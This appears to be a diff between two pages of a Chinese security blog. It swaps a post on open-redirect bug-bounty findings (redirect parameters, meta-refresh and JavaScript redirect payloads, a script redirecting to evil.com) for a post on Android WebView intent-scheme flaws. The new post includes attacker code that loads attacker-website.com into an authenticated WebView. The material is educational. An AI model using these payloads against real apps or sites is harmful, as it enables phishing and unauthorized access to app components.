@@ -19,7 +19,7 @@
     <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
 
 
-<title>公开web漏洞报告逻辑分析整理[持续更新] | tea9のblog</title>
+<title>Android webview漏洞 | tea9のblog</title>
 
 
 
@@ -202,7 +202,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">公开web漏洞报告逻辑分析整理[持续更新]</h1>
+            <h1 class="post-title">Android webview漏洞</h1>
             
                 <div class="post-meta">
                     
@@ -211,7 +211,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">三月 7, 2050&nbsp;&nbsp;21:23:23</a>
+                        Date: <a href="#">八月 15, 2023&nbsp;&nbsp;21:23:23</a>
                         </span>
                     
                     
@@ -227,48 +227,34 @@
         </header>
 
         <div class="post-content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近因为个人所得税要补很多，所以重新整理复盘下漏洞报告，准备挖src补一下子亏空。</p>
-<p><strong>重要</strong>：挖src之前第一步一般是信息收集，但比信息收集更重要的是看src都收哪些漏洞，然后再去挖。 比如一些src不收xss什么的那就直接不费力气去测了，一般会在src提交漏洞页面上有说明文档，补天、火线等在企业src的界面上会写域名及收录的漏洞类型。</p>
-<h2 id="web漏洞及场景"><a href="#web漏洞及场景" class="headerlink" title="web漏洞及场景"></a>web漏洞及场景</h2><h3 id="开放式重定向（open-redirect"><a href="#开放式重定向（open-redirect" class="headerlink" title="开放式重定向（open redirect"></a>开放式重定向（open redirect</h3><p>国外叫开放式重定向漏洞在国内通常叫url跳转？ 我是这么理解的</p>
-<p>低危</p>
-<h4 id="通过url参数进行攻击"><a href="#通过url参数进行攻击" class="headerlink" title="通过url参数进行攻击"></a>通过url参数进行攻击</h4><p>特征参数：</p>
-<p>domain_name&#x3D;</p>
-<p>redirect_to&#x3D;</p>
-<p>url&#x3D;</p>
-<p>redirect&#x3D;</p>
-<p>next&#x3D;</p>
-<p>checkout_url&#x3D;</p>
-<h4 id="通过meta标签攻击"><a href="#通过meta标签攻击" class="headerlink" title="通过meta标签攻击"></a>通过meta标签攻击</h4><p>当meta标签内容可控也可以通过meta标签进行攻击，meta标签可以告知浏览器刷新网页，并向标签中content属性定义的URL发起GET请求，0为需要等待的时间为0秒</p>
-<p>HTML<meta>标签攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=https://www.xx.com/&quot;&gt;</span><br></pre></td></tr></table></figure>
+            <h1 id="Android-WebView漏洞"><a href="#Android-WebView漏洞" class="headerlink" title="Android WebView漏洞"></a>Android WebView漏洞</h1><p>WebView是显示网页的View。WebView 对象将 Web 内容显示为活动布局的一部分，但缺少一些正常浏览器的一些功能</p>
+<h2 id="0x00-访问任意组件"><a href="#0x00-访问任意组件" class="headerlink" title="0x00 访问任意组件"></a>0x00 访问任意组件</h2><p>Intent类允许开发使用toUri(flags)方法将意图转换为包含其 URI 表示形式的字符串，并使用[parseUri(stringUri, flags)](<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#parseUri">https://developer.android.com/reference/android/content/Intent#parseUri</a>(java.lang.String, int))方法从此 URI 创建Intent。应用程序可以使用它来将带有方案的 URL 解析为Intent，并在 WebView 中处理 URL 时启动活动。如果处理未正确实现，您可以访问应用程序的任意组件。</p>
+<p>开发人员可以重写WebViewClient 类的[shouldOverrideUrlLoading()方法来处理在 WebView 中加载新链接的所有工作。](<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/webkit/WebViewClient#shouldOverrideUrlLoading">https://developer.android.com/reference/android/webkit/WebViewClient#shouldOverrideUrlLoading</a>(android.webkit.WebView, android.webkit.WebResourceRequest))错误处理的示例如下所示：</p>
+<p>受害者应用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) &#123;</span><br><span class="line">    Uri uri = request.getUrl();</span><br><span class="line">    if (&quot;intent&quot;.equals(uri.getScheme())) &#123;</span><br><span class="line">        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return super.shouldOverrideUrlLoading(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>受害者Activity：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// AuthWebViewActivity</span><br><span class="line">webView.loadUrl(getIntent().getStringExtra(&quot;url&quot;), getAuthHeaders());</span><br></pre></td></tr></table></figure>
 
-<h4 id="通过js-dom-location攻击"><a href="#通过js-dom-location攻击" class="headerlink" title="通过js dom location攻击"></a>通过js dom location攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.location = https://www.xx.com/</span><br><span class="line">window.location.href = https://www.xx.com</span><br><span class="line">window.location.replace(https://www.xx.com)</span><br></pre></td></tr></table></figure>
+<p>以上代码为 URL 添加了一个自定义处理程序，其<code>intent</code>方案使用传递的 URL 启动新活动。您可以通过创建 WebView 并将其重定向到特制的<code>intent-scheme</code>URL 来利用此错误进行攻击：</p>
+<p>攻击者代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Intent-scheme URL creation</span><br><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;);</span><br><span class="line">intent.putExtra(&quot;url&quot;, &quot;http://attacker-website.com/&quot;);</span><br><span class="line">String url = intent.toUri(Intent.URI_INTENT_SCHEME);</span><br><span class="line">// &quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end&quot;</span><br><span class="line">Log.d(&quot;d&quot;, url);</span><br></pre></td></tr></table></figure>
 
+<p>或者使用js代码进行重定向启动：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Redirect within WebView</span><br><span class="line">location.href = &quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end&quot;;</span><br></pre></td></tr></table></figure>
 
-
-<p>危害：可以用于钓鱼攻击，利用可信网址伪装钓鱼网址，钓鱼网址可能用于欺诈、恶意软件传播、窃取用户登录信息</p>
-<h4 id="漏洞报告"><a href="#漏洞报告" class="headerlink" title="漏洞报告"></a>漏洞报告</h4><p>Shopify主题设置的开放式重定向漏洞</p>
-<p><a target="_blank" rel="noopener" href="https://apps.shopify.com/services/google/themes/preview/supply--blue?domain_name=">https://apps.shopify.com/services/google/themes/preview/supply--blue?domain_name=</a></p>
-<p>验证&#x2F;admin到最后的URL结尾,但未验证是否是shopify的域名</p>
-<p>最后的攻击url</p>
-<p>http:&#x2F;&#x2F;<attacker>.com&#x2F;admin</p>
-<hr>
-<p>Shopify登录处开放式重定向</p>
-<p><a target="_blank" rel="noopener" href="http://mystore.myshopify.com/account/login?checkout_url=.attacker.com">http://mystore.myshopify.com/account/login?checkout_url=.attacker.com</a></p>
-<p>只能控制checkout_url后面可以通过增加.或者@测试是否可以控制重定向位置</p>
-<hr>
-<p>主题编辑器&#x2F;富文本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&quot;http://evil.com;&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>越权删除帖子，修改id，id获取途径分享、帖子详情等</p>
-<p>报告：</p>
-<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/1819832">https://hackerone.com/reports/1819832</a></p>
-<h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><p>注销的时候传一个url会导致重定向跳转</p>
-<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/1788006">https://hackerone.com/reports/1788006</a></p>
-
+<p>但是，有几个限制：</p>
+<ul>
+<li><p>嵌入的 Intent<code>Parcelable</code>和<code>Serializable</code>对象无法转换为字符串，这些对象将被忽略。</p>
+</li>
+<li><p>Intent.parseUri [(stringUri, flags)](<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#parseUri">https://developer.android.com/reference/android/content/Intent#parseUri</a>(java.lang.String, int))默认忽略<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION">Intent.FLAG_GRANT_READ_URI_PERMISSION</a>和<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_WRITE_URI_PERMISSION">Intent.FLAG_GRANT_WRITE_URI_PERMISSION</a>标志。仅当设置了<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#URI_ALLOW_UNSAFE">Intent.URI_ALLOW_UNSAFE</a>标志时，解析器才会保留它们。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.mbsd.jp/Whitepaper/IntentScheme.pdf">– 通过意图方案</a></li>
+</ul>
+<h2 id="添加Javascript接口"><a href="#添加Javascript接口" class="headerlink" title="添加Javascript接口"></a>添加Javascript接口</h2><h2 id="0x01-添加Javascript接口"><a href="#0x01-添加Javascript接口" class="headerlink" title="0x01 添加Javascript接口"></a>0x01 添加Javascript接口</h2><h2 id="0x02-绕过URL验证"><a href="#0x02-绕过URL验证" class="headerlink" title="0x02 绕过URL验证"></a>0x02 绕过URL验证</h2><h2 id="设置WebContentsDebug"><a href="#设置WebContentsDebug" class="headerlink" title="设置WebContentsDebug"></a>设置WebContentsDebug</h2><h2 id="WebResourceResponse-漏洞"><a href="#WebResourceResponse-漏洞" class="headerlink" title="WebResourceResponse 漏洞"></a>WebResourceResponse 漏洞</h2><h2 id="WebSettings-漏洞"><a href="#WebSettings-漏洞" class="headerlink" title="WebSettings 漏洞"></a>WebSettings 漏洞</h2><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2>
         </div>
 
         
@@ -282,7 +268,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://tea9.xyz/post/379246801.html">http://tea9.xyz/post/379246801.html</a></span>
+                        <span><a href="http://tea9.xyz/post/1495034172.html">http://tea9.xyz/post/1495034172.html</a></span>
                     </p>
                 
                 
@@ -306,7 +292,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                        <a href="/tags/android%E5%AE%89%E5%85%A8/"># android安全</a>
                     
                         
                 </span>
@@ -319,8 +305,10 @@
         </section>
         <section class="post-nav">
             
+                <a class="prev" rel="prev" href="/post/379246801.html">公开web漏洞报告逻辑分析整理[持续更新]</a>
             
-            <a class="next" rel="next" href="/post/1495034172.html">Android webview漏洞</a>
+            
+            <a class="next" rel="next" href="/post/3955029377.html">Android deeplink漏洞</a>
             
         </section>
     </article>
